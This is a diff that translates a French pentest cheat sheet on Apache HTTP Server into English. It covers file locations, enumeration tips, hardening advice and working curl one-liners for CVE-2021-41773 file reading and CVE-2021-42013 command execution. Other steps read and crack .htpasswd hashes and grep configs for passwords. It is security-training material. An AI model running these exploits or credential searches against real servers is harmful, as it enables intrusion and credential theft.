@@ -1,25 +1,25 @@
 # Apache HTTP Server
 
-!!! info "Informations"
-    **Catégorie:** Web Server  
+!!! info "Information"
+    **Category:** Web Server  
     **Tags:** 'web' 'http' 'server' 'apache'  
-    **Criticité:** 🔴 Haute
+    **Criticality:** 🔴 High
 
 ## Description
 
-Apache HTTP Server est le serveur web open source le plus populaire au monde. Il est utilisé pour héberger des sites web et applications sur Internet depuis 1995. Apache est connu pour sa flexibilité, sa robustesse et son architecture modulaire.
+Apache HTTP Server is the world's most popular open-source web server. It has been used to host websites and applications on the Internet since 1995. Apache is known for its flexibility, robustness, and modular architecture.
 
 ---
 
-## Fichiers de Configuration
+## Configuration Files
 
 === "Linux (Debian/Ubuntu)"
     ```bash
-    # Configuration principale
+    # Main configuration
     /etc/apache2/apache2.conf
     /etc/apache2/envvars
     
-    # Sites disponibles et activés
+    # Available and enabled sites
     /etc/apache2/sites-available/
     /etc/apache2/sites-enabled/
     
@@ -27,7 +27,7 @@ Apache HTTP Server est le serveur web open source le plus populaire au monde. Il
     /etc/apache2/mods-available/
     /etc/apache2/mods-enabled/
     
-    # Configuration supplémentaire
+    # Additional configuration
     /etc/apache2/conf-available/
     /etc/apache2/conf-enabled/
     
@@ -37,10 +37,10 @@ Apache HTTP Server est le serveur web open source le plus populaire au monde. Il
 
 === "Linux (RedHat/CentOS)"
     ```bash
-    # Configuration principale
+    # Main configuration
     /etc/httpd/conf/httpd.conf
     
-    # Configuration additionnelle
+    # Additional configuration
     /etc/httpd/conf.d/
     /etc/httpd/conf.modules.d/
     
@@ -50,7 +50,7 @@ Apache HTTP Server est le serveur web open source le plus populaire au monde. Il
 
 === "Windows"
     ```powershell
-    # Installation standard
+    # Standard installation
     C:\Apache24\conf\httpd.conf
     C:\Apache24\conf\extra\
     
@@ -64,7 +64,7 @@ Apache HTTP Server est le serveur web open source le plus populaire au monde. Il
 
 === "macOS"
     ```bash
-    # Installation système
+    # System installation
     /etc/apache2/httpd.conf
     /etc/apache2/extra/
     
@@ -75,7 +75,7 @@ Apache HTTP Server est le serveur web open source le plus populaire au monde. Il
 
 ---
 
-## Fichiers de Logs
+## Log Files
 
 ```bash
 # Debian/Ubuntu
@@ -94,19 +94,19 @@ C:\xampp\apache\logs\error.log
 
 ---
 
-## Fichiers Sensibles
+## Sensitive Files
 
-!!! danger "Credentials et données sensibles"
-    Les fichiers suivants peuvent contenir des informations critiques :
+!!! danger "Credentials and sensitive data"
+    The following files may contain critical information:
     
-    - `.htpasswd` - Fichiers de mots de passe (Basic Auth)
-    - `.htaccess` - Règles de configuration et redirections
-    - `ssl/private/*.key` - Clés privées SSL/TLS
-    - `conf.d/*-secrets.conf` - Configurations avec secrets
-    - `/etc/apache2/envvars` - Variables d'environnement
+    - `.htpasswd` - Password files (Basic Auth)
+    - `.htaccess` - Configuration rules and redirections
+    - `ssl/private/*.key` - SSL/TLS private keys
+    - `conf.d/*-secrets.conf` - Configurations with secrets
+    - `/etc/apache2/envvars` - Environment variables
 
-!!! warning "Fichiers de sauvegarde"
-    N'oubliez pas de vérifier les backups :
+!!! warning "Backup files"
+    Don't forget to check for backups:
     
     - `*.conf~`
     - `*.conf.bak`
@@ -116,7 +116,7 @@ C:\xampp\apache\logs\error.log
 
 ---
 
-## Répertoires Web
+## Web Directories
 
 ```bash
 # Debian/Ubuntu
@@ -136,101 +136,101 @@ C:\xampp\htdocs\
 
 ---
 
-## Tips Pentest
+## Pentest Tips
 
 !!! tip "Reconnaissance"
-    - Identifier la version via les headers HTTP : `Server: Apache/2.4.41`
-    - Vérifier les modules chargés : `apache2 -M` ou `httpd -M`
-    - Scanner les ports : 80 (HTTP), 443 (HTTPS), 8080, 8443
+    - Identify version via HTTP headers: `Server: Apache/2.4.41`
+    - Check loaded modules: `apache2 -M` or `httpd -M`
+    - Scan ports: 80 (HTTP), 443 (HTTPS), 8080, 8443
 
-!!! tip "Énumération"
-    - Chercher les répertoires exposés : `.git/`, `.svn/`, `backup/`
-    - Tester les fichiers sensibles : `.htaccess`, `.htpasswd`, `phpinfo.php`
-    - Identifier les VirtualHosts via SNI ou Host header manipulation
-    - Lister les fichiers dans `/icons/`, `/manual/` si activés
+!!! tip "Enumeration"
+    - Look for exposed directories: `.git/`, `.svn/`, `backup/`
+    - Test for sensitive files: `.htaccess`, `.htpasswd`, `phpinfo.php`
+    - Identify VirtualHosts via SNI or Host header manipulation
+    - List files in `/icons/`, `/manual/` if enabled
 
 !!! tip "Exploitation"
-    - **Path Traversal** : Tester `../../../etc/passwd` si mal configuré
-    - **Server-Side Includes (SSI)** : Chercher `.shtml` files
-    - **CGI Scripts** : Vérifier `/cgi-bin/` pour shellshock ou autres vulns
-    - **Mod_rewrite** : Analyser les règles pour bypass d'authentification
+    - **Path Traversal**: Test `../../../etc/passwd` if misconfigured
+    - **Server-Side Includes (SSI)**: Look for `.shtml` files
+    - **CGI Scripts**: Check `/cgi-bin/` for shellshock or other vulns
+    - **Mod_rewrite**: Analyze rules for authentication bypass
 
 !!! tip "Post-Exploitation"
-    - Extraire les credentials de `.htpasswd` (hash MD5)
-    - Analyser les logs pour trouver d'autres cibles
-    - Chercher les tokens/API keys dans les fichiers de config
-    - Identifier les applications hébergées via les VirtualHosts
+    - Extract credentials from `.htpasswd` (MD5 hash)
+    - Analyze logs to find other targets
+    - Search for tokens/API keys in config files
+    - Identify hosted applications via VirtualHosts
 
 ---
 
-## Commandes Utiles
+## Useful Commands
 
 ```bash
-# Vérifier si Apache est actif
+# Check if Apache is running
 systemctl status apache2  # Debian/Ubuntu
 systemctl status httpd    # RedHat/CentOS
 ps aux | grep apache
 
-# Tester la configuration
+# Test configuration
 apache2ctl configtest     # Debian/Ubuntu
 httpd -t                  # RedHat/CentOS
 
-# Lister les modules chargés
+# List loaded modules
 apache2ctl -M             # Debian/Ubuntu
 httpd -M                  # RedHat/CentOS
 
-# Localiser les fichiers de configuration
+# Locate configuration files
 find / -name "apache*.conf" 2>/dev/null
 find / -name "httpd.conf" 2>/dev/null
 locate apache2.conf
 
-# Rechercher des credentials
+# Search for credentials
 grep -r "password" /etc/apache2/ 2>/dev/null
 grep -r "Auth" /etc/apache2/ 2>/dev/null
 
-# Lire les logs en temps réel
+# Read logs in real-time
 tail -f /var/log/apache2/access.log
 tail -f /var/log/apache2/error.log
 ```
 
 ---
 
-## Vulnérabilités Connues
+## Known Vulnerabilities
 
 ??? danger "CVE-2021-41773 - Path Traversal"
-    Vulnérabilité critique permettant la lecture de fichiers arbitraires.
+    Critical vulnerability allowing arbitrary file reading.
     
-    **Versions affectées :** Apache 2.4.49  
-    **Exploit :**
+    **Affected versions:** Apache 2.4.49  
+    **Exploit:**
     ```bash
     curl http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
     ```
 
 ??? danger "CVE-2021-42013 - RCE via Path Traversal"
-    Contournement du patch CVE-2021-41773 permettant l'exécution de code.
+    Bypass of CVE-2021-41773 patch allowing code execution.
     
-    **Versions affectées :** Apache 2.4.49, 2.4.50  
-    **Exploit :**
+    **Affected versions:** Apache 2.4.49, 2.4.50  
+    **Exploit:**
     ```bash
     curl 'http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'
     ```
 
 ---
 
-## Sécurisation
+## Hardening
 
-!!! success "Bonnes pratiques"
-    - Désactiver la signature du serveur : `ServerTokens Prod` et `ServerSignature Off`
-    - Restreindre l'accès aux répertoires sensibles via `.htaccess`
-    - Utiliser HTTPS avec des certificats valides (Let's Encrypt)
-    - Désactiver les modules non utilisés : `a2dismod [module]`
-    - Limiter la taille des requêtes : `LimitRequestBody`
-    - Activer ModSecurity (WAF)
-    - Maintenir Apache à jour régulièrement
+!!! success "Best practices"
+    - Disable server signature: `ServerTokens Prod` and `ServerSignature Off`
+    - Restrict access to sensitive directories via `.htaccess`
+    - Use HTTPS with valid certificates (Let's Encrypt)
+    - Disable unused modules: `a2dismod [module]`
+    - Limit request size: `LimitRequestBody`
+    - Enable ModSecurity (WAF)
+    - Keep Apache regularly updated
 
 ---
 
-## Références
+## References
 
 - [Apache HTTP Server Documentation](https://httpd.apache.org/docs/)
 - [OWASP Web Server Configuration](https://cheatsheetseries.owasp.org/cheatsheets/Apache_Configuration_Cheat_Sheet.html)
@@ -239,21 +239,21 @@ tail -f /var/log/apache2/error.log
 
 ---
 
-## Exemples d'Exploitation
+## Exploitation Examples
 
-??? example "Lecture de .htpasswd"
+??? example "Reading .htpasswd"
     ```bash
-    # Si le répertoire est mal configuré
+    # If directory is misconfigured
     curl http://target/.htpasswd
     
-    # Hash trouvé
+    # Hash found
     admin:$apr1$ABC123$xyz...
     
-    # Cracker avec John
+    # Crack with John
     john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt
     ```
 
-??? example "Énumération VirtualHosts"
+??? example "VirtualHost Enumeration"
     ```bash
     # Via Host header
     for vhost in www admin api dev staging; do
@@ -266,9 +266,9 @@ tail -f /var/log/apache2/error.log
 
 ---
 
-## Métadonnées
+## Metadata
 
-- **Version du template:** 1.0
-- **Dernière mise à jour:** Novembre 2024
-- **Contributeur:** EpiHack Bénin
-- **Sources vérifiées:** Oui
+- **Template version:** 1.0
+- **Last updated:** November 2024
+- **Contributor:** EpiHack Benin
+- **Sources verified:** Yes
